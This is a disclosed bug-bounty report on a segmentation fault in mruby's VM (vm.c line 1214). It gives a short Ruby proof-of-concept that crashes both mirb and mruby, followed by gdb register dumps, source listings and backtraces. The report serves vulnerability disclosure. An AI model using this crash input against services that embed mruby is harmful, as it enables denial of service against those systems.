# SIGSEGV - vm.c - line:1214

## Report Details
- **Report ID**: 201905
- **URL**: https://hackerone.com/reports/201905
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-29T11:09:12.690Z
- **Disclosed**: 2017-03-29T23:34:29.594Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec_1214.rb):

	def test
	instance_exec do return to_enum:==end ensure end
	test

Debug - mirb
-------------------

	(gdb) r test_mrb_vm_exec_1214.rb 
	Starting program: /home/x/Desktop/research/3_fuzz/mruby/bin/mirb test_mrb_vm_exec_1214.rb
	mirb - Embeddable Interactive Ruby Shell

	 => :test

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000412418 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214
	1214	        JUMP;
	(gdb) info reg
	rax            0x6fb4	28596
	rbx            0x8	8
	rcx            0x748350	7635792
	rdx            0x765520	7755040
	rsi            0x748350	7635792
	rdi            0x759010	7704592
	rbp            0x759010	0x759010
	rsp            0x7fffffffc780	0x7fffffffc780
	r8             0xfffffffffffffffc	-4
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x4a	74
	r11            0x759030	7704624
	r12            0xfffffffffffffffc	-4
	r13            0x0	0
	r14            0x0	0
	r15            0x759030	7704624
	rip            0x412418	0x412418 <mrb_vm_exec+15352>
	eflags         0x10206	[ PF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1209	        }
	1210	        mrb->c->stack[0] = result;
	1211	        mrb->c->stack = ci->stackent;
	1212	        pc = ci->pc;
	1213	        cipop(mrb);
	1214	        JUMP;
	1215	      }
	1216	      else {
	1217	        /* setup environment for calling method */
	1218	        proc = mrb->c->ci->proc = m;


Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x0000000000412418 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214
	#1  0x0000000000402e68 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Debug - mruby
-------------------

	(gdb) r test_mrb_vm_exec_1214.rb 
	Starting program: /home/x/Desktop/research/3_fuzz/mruby/bin/mruby test_mrb_vm_exec_1214.rb

	Program received signal SIGSEGV, Segmentation fault.
	0x00000000004120b8 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214
	1214	        JUMP;
	(gdb) info reg
	rax            0x6fb4	28596
	rbx            0x8	8
	rcx            0x748330	7635760
	rdx            0x765520	7755040
	rsi            0x748330	7635760
	rdi            0x759010	7704592
	rbp            0x759010	0x759010
	rsp            0x7fffffffd900	0x7fffffffd900
	r8             0xfffffffffffffffc	-4
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x4a	74
	r11            0x759030	7704624
	r12            0xfffffffffffffffc	-4
	r13            0x0	0
	r14            0x0	0
	r15            0x759030	7704624
	rip            0x4120b8	0x4120b8 <mrb_vm_exec+15352>
	eflags         0x10206	[ PF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1209	        }
	1210	        mrb->c->stack[0] = result;
	1211	        mrb->c->stack = ci->stackent;
	1212	        pc = ci->pc;
	1213	        cipop(mrb);
	1214	        JUMP;
	1215	      }
	1216	      else {
	1217	        /* setup environment for calling method */
	1218	        proc = mrb->c->ci->proc = m;

Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x00000000004120b8 in mrb_vm_exec (mrb=<optimized out>, proc=<optimized out>, pc=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:1214
	#1  0x000000000041bebd in mrb_vm_run (proc=0x75c150, self=..., stack_keep=4294967292, mrb=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:790
	#2  mrb_top_run (mrb=0x759010, proc=0x75c150, self=..., stack_keep=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/src/vm.c:2514
	#3  0x00000000004a533f in mrb_load_exec (mrb=0x759010, p=<optimized out>, c=0x7b40e0) at /home/x/Desktop/research/3_fuzz/mruby/mrbgems/mruby-compiler/core/parse.y:5755
	#4  0x0000000000402c67 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/3_fuzz/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232

Impact
-------------------

It can cause DoS.

## Attachments
- test_mrb_vm_exec_1214.rb
